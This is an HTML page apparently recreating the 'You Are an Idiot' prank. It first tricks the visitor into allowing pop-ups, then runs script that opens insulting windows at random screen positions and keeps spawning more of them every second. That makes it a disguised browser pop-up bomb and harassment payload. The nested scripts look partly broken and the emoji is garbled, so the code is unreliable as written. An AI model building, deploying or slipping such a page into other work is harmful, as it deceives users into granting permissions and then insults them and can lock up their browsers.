<!DOCTYPE html>
<html lang="en">
<head>
    <title>Enable Pop-ups</title>
    <script>
        function requestPermission() {
            var popUpTest = window.open("about:blank", "_blank", "width=400,height=200");

            if (popUpTest) {
                popUpTest.document.write(`
                    <html>
                    <head><title>Enable Pop-ups</title></head>
                    <body style="text-align:center; font-family:sans-serif;">
                        <h2>Allow pop-ups & redirects</h2>
                        <p>Then click below:</p>
                        <button onclick="window.opener.startMadness()">I have allowed them</button>
                    </body>
                    </html>
                `);
                popUpTest.document.close();
            }
        }

        function startMadness() {
            function openSelfReplicatingWindow() {
                var newWin = window.open("about:blank", "_blank", 'width=357,height=330');

                if (newWin) {
                    var screenWidth = screen.width - 357;
                    var screenHeight = screen.height - 330;
                    var randomX = Math.floor(Math.random() * screenWidth);
                    var randomY = Math.floor(Math.random() * screenHeight);

                    newWin.moveTo(randomX, randomY);

                    newWin.document.write(`
                        <html>
                        <head>
                            <title>You Are an Idiot!</title>
                            <style>
                                body { background: yellow; color: black; text-align: center; font-size: 20px; margin-top: 100px; }
                            </style>
                        </head>
                        <body>
                            <h1>You are an IDIOT! ðŸ¤¡</h1>
                            <script>
                                function spawnMore() {
                                    for (var i = 0; i < 3; i++) {
                                        var childWin = window.open("about:blank", "_blank", "width=357,height=330");
                                        if (childWin) {
                                            childWin.document.write('<script>setTimeout(spawnMore, 1000);<\\/script>');
                                            childWin.document.close();
                                        }
                                    }
                                }
                                setTimeout(spawnMore, 1000);
                            </script>
                        </body>
                        </html>
                    `);

                    newWin.document.close();
                }
            }

            openSelfReplicatingWindow();
        }
    </script>
</head>
<body onload="requestPermission()">
    <h1>Enable Pop-ups & Redirects</h1>
</body>
</html>
